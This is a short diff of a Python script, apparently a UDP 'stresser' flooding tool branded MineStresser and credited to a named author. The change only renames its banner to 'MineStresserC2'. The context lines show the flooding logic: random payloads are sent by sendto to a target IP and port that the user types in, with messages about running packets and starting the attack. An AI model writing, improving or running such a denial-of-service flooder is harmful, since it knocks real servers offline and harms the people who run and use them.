@@ -15,7 +15,7 @@ def attack(ip, port):
     payload = os.urandom(len)
     s.sendto(payload, (ip, port))
 # VPS
-os.system("figlet MineStresser")
+os.system("figlet MineStresserC2")
 print("\033[92m")
 print("Credit: @MineGamerST")
 print(" ")
@@ -25,7 +25,7 @@ port = int(input("Port: "))
 print(f"Server Connect: {ip} {port}")
 time.sleep(3)
 os.system("clear")
-os.system("figlet MineStresser")
+os.system("figlet MineStresserC2")
 print(" ")
 print(f"Running Packets > {ip} : {port}")
 # Start Attack
